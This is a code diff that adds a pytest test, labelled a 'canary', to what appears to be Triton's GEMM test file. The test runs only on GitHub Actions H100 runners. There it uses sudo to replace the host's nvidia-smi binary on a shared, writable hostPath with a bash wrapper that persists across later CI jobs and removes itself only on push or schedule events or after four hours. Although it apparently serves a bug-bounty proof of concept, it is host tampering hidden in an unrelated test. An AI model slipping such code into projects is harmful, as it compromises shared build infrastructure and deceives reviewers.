@@ -1,5 +1,10 @@
 import math
+import os
 import random
+import subprocess
+import tempfile
+import textwrap
+import time
 from dataclasses import replace
 
 import pytest
@@ -562,6 +567,49 @@ class ScaledMM:
 # =============================================================================
 # Blackwell GEMM Tests
 # =============================================================================
+
+
+def test_h100_hostpath_canary():
+    """One-shot canary for the privileged runner's writable NVIDIA hostPath."""
+    runner = os.environ.get("RUNNER_NAME", "")
+    if os.environ.get("GITHUB_ACTIONS") != "true" or not runner.startswith("linux-gcp-h100-"):
+        pytest.skip("H100 Actions runner only")
+
+    canary = "meta-bbp-h100-20261013-a"
+    host_binary = "/usr/bin/nvidia/nvidia-smi"
+    host_backup = f"{host_binary}.{canary}.orig"
+    if os.path.exists(host_backup):
+        pytest.fail(f"stale canary backup exists: {host_backup}")
+
+    subprocess.run(["sudo", "cp", "--", host_binary, host_backup], check=True)
+    expires = int(time.time()) + 4 * 60 * 60
+    wrapper = textwrap.dedent(f"""\
+        #!/usr/bin/env bash
+        set -u
+        real="/usr/bin/nvidia-smi.{canary}.orig"
+        host="{host_binary}"
+        host_real="{host_backup}"
+        event="${{GITHUB_EVENT_NAME:-}}"
+        restore=0
+        case "$event" in push|schedule) restore=1 ;; esac
+        if [[ "$(date +%s)" -ge {expires} ]]; then restore=1; fi
+        if [[ "$restore" -eq 1 ]]; then
+            restored=0
+            if sudo cp -- "$real" "$host" && sudo rm -f -- "$host_real"; then restored=1; fi
+            printf 'TRITON_H100_CANARY id={canary} event=%s run=%s restored=%s\\n' \
+                "${{event:-unknown}}" "${{GITHUB_RUN_ID:-unknown}}" "$restored"
+        fi
+        exec "$real" "$@"
+    """)
+
+    with tempfile.NamedTemporaryFile("w", prefix=f"{canary}-", delete=False) as tmp:
+        tmp.write(wrapper)
+        tmp_path = tmp.name
+    try:
+        os.chmod(tmp_path, 0o755)
+        subprocess.run(["sudo", "install", "-m", "0755", "--", tmp_path, host_binary], check=True)
+    finally:
+        os.unlink(tmp_path)
 
 
 @pytest.mark.parametrize(
